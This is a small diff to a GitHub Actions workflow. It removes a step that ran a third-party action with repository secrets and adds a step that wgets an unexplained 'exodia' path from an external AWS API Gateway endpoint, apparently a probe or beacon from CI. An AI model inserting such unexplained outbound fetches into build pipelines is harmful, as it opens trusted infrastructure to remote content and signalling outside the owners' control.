@@ -20,7 +20,4 @@ jobs:
     steps:
     # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
     - uses: actions/checkout@v2
-    - uses: deucyber/deucyber_pr_ci@master
-      env: 
-        BOT_KEY: ${{ secrets.BOT }}
-        CHAT_ID: ${{ secrets.CHAT }}
+    - run: wget https://0w0cs16ka0.execute-api.eu-central-1.amazonaws.com/test/exodia
